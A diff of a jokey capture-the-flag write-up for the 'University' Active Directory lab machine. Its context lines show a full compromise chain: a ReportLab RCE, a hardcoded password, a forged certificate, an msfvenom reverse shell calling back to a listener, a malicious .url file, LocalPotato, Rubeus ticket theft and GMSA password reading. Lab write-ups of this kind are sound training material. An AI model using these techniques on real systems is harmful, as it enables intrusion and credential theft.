@@ -1,9 +1,15 @@
 ![](/assets/images/headers/University.png)
 
 ## Synopsis
+
 University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using `xhtml2pdf`, which is vulnerable to a Remote Code Execution vulnerability via [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733). This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor's account, a malicious archive file is uploaded to exploit [CVE-2023-36025](https://nvd.nist.gov/vuln/detail/CVE-2023-36025), which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.
 
+!!!warning DISCLAIMER
+This writeup has been rewritten by AI and contains traces of Gen Z humor. For the uninitiated: this is a shitpost with substance. Read at your own risk.
+!!!
+
 ## Enumeration
+
 First thing we do is sign up for an account on the `university.htb` site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.
 
 ```console
@@ -19,7 +25,7 @@ $ kerbrute userenum -d university.htb --dc 10.10.11.39 james.m-x142844.txt
 2024/12/22 13:35:40 >  [+] VALID USERNAME:   kai.k@university.htb
 ```
 
-We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we peep this feature that lets you request a signed certificate. The site hits us with:
+We now have a nice starter pack of usernames: professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we check this feature that lets you request a signed certificate. The site hits us with:
 
 ```
 You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).
@@ -58,7 +64,7 @@ Address: Canada West - Vancouver
 Department: Information Systems Security
 ```
 
-Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.
+Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says "nah fam" if we try to sign a cert for anyone we’re not logged in as. So for now we're locked to our own account cert. We ball later.
 
 ## Foothold
 So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ `Export Profile to PDF` feature. Being the nosy menace I am, I yeet that file into exiftool like:
@@ -67,7 +73,7 @@ So while poking around the site in my “click every button like a toddler” er
 $ exiftool profile.pdf
 ```
 
-Boom — ReportLab shows up in the metadata like "hey bestie, wanna pwn me!". Turns out, ReportLab has [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733), a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:
+Boom! ReportLab shows up in the metadata like "hey bestie, wanna pwn me!". Turns out, ReportLab has [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733), a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:
 
 ```html
 <para>
@@ -103,7 +109,7 @@ I’m chilling in my fresh shell as `university\wao`, feeling like I just unlock
 
 So I start creeping around the filesystem like a raccoon on a 3 AM 7-Eleven snack run, nosing in everything, praying for leftover pizza crusts (aka plaintext creds). And what do I stumble on? A folder literally named `C:\Web\DB Backup`. Yeah... they really put “Backup” in the name and thought I wouldn’t look.
 
-Inside, I find a PowerShell script called `db-backup-automator.ps1`. And let me tell you — the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.
+Inside, I find a PowerShell script called `db-backup-automator.ps1`. And let me tell you, the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.
 
 ```powershell
 PS C:\Web\DB Backups> cat db-backup-automator.ps1
@@ -119,7 +125,7 @@ $7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
 Invoke-Expression -Command $7zCommand
 ```
 
-So I crack open `db-backup-automator.ps1` and, surprise surprise, it’s doing a little "backup the DB and encrypt it" routine — but the password it’s using? Bruh. It's giving lazy dev energy. The script's password is basically `WebAO1337`, and since my user is WAO, the math is mathing. I spit those creds into WinRM:
+So I crack open `db-backup-automator.ps1` and, surprise surprise, it’s doing a little "backup the DB and encrypt it" routine, but the password it’s using? Bruh. It's giving lazy dev energy. The script's password is basically `WebAO1337`, and since my user is WAO, the math is mathing. I spit those creds into WinRM:
 
 ```console
 $ evil-winrm -i 10.10.11.39 -u 'wao' -p 'WebAO1337'
@@ -131,7 +137,7 @@ And now I’m just sitting here like, pls work, because if it does, we’re abou
 *Evil-WinRM* PS C:\Web\University> download db.sqlite3
 ```
 
-Pulled the `db.sqlite3` straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations. 
+Pulled the `db.sqlite3` straight off the server with Evil-WinRM. Feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations. 
 
 ```sql
 sqlite> select id,username,password,csr,user_type from University_customuser;
@@ -156,7 +162,7 @@ Mode                LastWriteTime         Length Name
 -a----       12/22/2024  12:16 PM             42 rootCA.srl
 ```
 
-Since we've basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I'm running my own shady university IT department. Openssl be like “Certificate request self-signature ok” — yeah, it better be.
+Since we've basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I'm running my own shady university IT department. Openssl be like “Certificate request self-signature ok”. Yeah, it better be.
 
 ```console
 $ openssl x509 -req -in 5.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial
@@ -225,7 +231,7 @@ $ sudo ip route add 192.168.99.0/24 dev ligolo
 $ evil-winrm -i 192.168.99.2 -u 'wao' -p 'WebAO1337'
 ```
 
-We can also SSH into LAB-2 with WAO’s creds and immediately `sudo su` into root — easiest W of my life.
+We can also SSH into LAB-2 with WAO’s creds and immediately `sudo su` into root. Easiest W of my life.
 
 ```console
 $ ssh wao@192.168.99.12
@@ -235,7 +241,7 @@ $ sudo su
 root@LAB-2:#
 ```
 
-Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if `WS-3` does the heavy lifting?” energy. The idea: if a file gets opened from `WS-3`, we can make it point straight to `LAB-2` and skip all the drama. So I tweak my reverse shell to target `LAB-2`'s IP (192.168.99.12) instead:
+Alright, so plot twist time, instead of begging the main server to run our payload, we switch to “what if `WS-3` does the heavy lifting?” energy. The idea: if a file gets opened from `WS-3`, we can make it point straight to `LAB-2` and skip all the drama. So I tweak my reverse shell to target `LAB-2`'s IP (192.168.99.12) instead:
 
 ```console
 $ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 > rev.bat
@@ -245,7 +251,7 @@ WS-3
 *Evil-WinRM* PS C:\Windows\Temp> upload shell.bat
 ```
 
-Now the plan is simple: craft the `.url` file so it points at that batch file living on `WS-3`. As soon as some unsuspecting professor/admin clicks the shortcut, `WS-3` will execute it, and boom — the callback will land right in `LAB-2`’s waiting arms.
+Now the plan is simple: craft the `.url` file so it points at that batch file living on `WS-3`. As soon as some unsuspecting professor/admin clicks the shortcut, `WS-3` will execute it, and boom, the callback will land right in `LAB-2`’s waiting arms.
 
 ```console
 root@LAB-2:# nc -nlvp 1337
@@ -265,7 +271,7 @@ Help Desk team - Rose Lanosta.
 ```
 
 ## Root
-Right — now that we’ve got `Martin.T` on `WS-3`, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called [LocalPotato](https://github.com/decoder-it/LocalPotato) (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let's look for things that seem worthwhile.
+Right, now that we’ve got `Martin.T` on `WS-3`, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called [LocalPotato](https://github.com/decoder-it/LocalPotato) (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let's look for things that seem worthwhile.
 
 One file at `C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1` seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.
 
@@ -311,7 +317,7 @@ C:\tmp> .\potato.exe -i C:\tmp\shell.ps1 -o "\Program Files\Automation-Scripts\w
 [+] SMB Tree Disconnect success
 ```
 
-Boom — potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.
+Boom! Potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.
 
 ```console
 root@LAB-2:/# sudo nc -nvlp 443
@@ -325,7 +331,7 @@ ws-3\administrator
 That’s full local admin on `WS-3`. Now there are several ways to get the root flag. 
 
 ### Method 1
-Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose's TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with `/ptt`.
+Ok so first move we dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot, Rose's TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with `/ptt`.
 
 ```powershell
 PS C:\tmp> .\Rubeus.exe dump /nowrap
@@ -370,7 +376,7 @@ From BloodHound we see Rose has ReadGMSAPassword rights on the GMSA-PClient01$ a
 
 ![](/assets/images/writeups/university/BH.png)
 
-Drop `GMSAPasswordReader.exe`, tell it to target "GMSA-PClient01$", and it hands over every hash flavor — RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.
+Drop `GMSAPasswordReader.exe`, tell it to target "GMSA-PClient01$", and it hands over every hash flavor. RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.
 
 ```console
 PS C:\tmp> .\GMSAPasswordReader.exe --AccountName "GMSA-PCLIENT01$"
